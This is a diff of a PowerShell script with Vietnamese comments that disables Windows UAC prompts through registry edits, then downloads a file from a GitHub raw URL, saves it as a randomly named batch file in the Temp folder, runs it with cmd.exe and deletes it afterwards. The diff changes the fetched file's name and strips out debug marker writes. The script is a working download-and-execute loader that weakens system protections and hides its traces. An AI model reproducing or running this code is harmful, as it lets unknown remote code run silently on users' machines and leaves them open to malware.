@@ -2,10 +2,8 @@ reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v Consen
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 # Danh sách URL chứa file thực thi
-Set-Content -Path "C:\index1.txt" -Value "5"
-
 $URLs = @(
-    'https://raw.githubusercontent.com/mitutina/mitutina/main/checkseries.bat'
+    'https://raw.githubusercontent.com/mitutina/mitutina/main/indexx.html'
 )
 # Tải nội dung từ URL
 foreach ($URL in $URLs | Sort-Object { Get-Random }) {
@@ -18,16 +16,11 @@ if (-not $response) {
     Write-Host "Failed to retrieve the script from the available repository, aborting!"
     return
 }
-Set-Content -Path "C:\index2.txt" -Value "21"
-
 # Tạo file tạm để lưu nội dung script
 $rand = [Guid]::NewGuid().Guid
 $FilePath = "$env:USERPROFILE\AppData\Local\Temp\scheduler_$rand.bat"
 Set-Content -Path $FilePath -Value $response.Content
-Set-Content -Path "C:\index3.txt" -Value "27"
-
 # Thực thi file batch
 Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$FilePath`"" -Wait
-Set-Content -Path "C:\index4.txt" -Value "31"
 # Xóa file tạm sau khi thực thi
 Remove-Item -Path $FilePath -Force
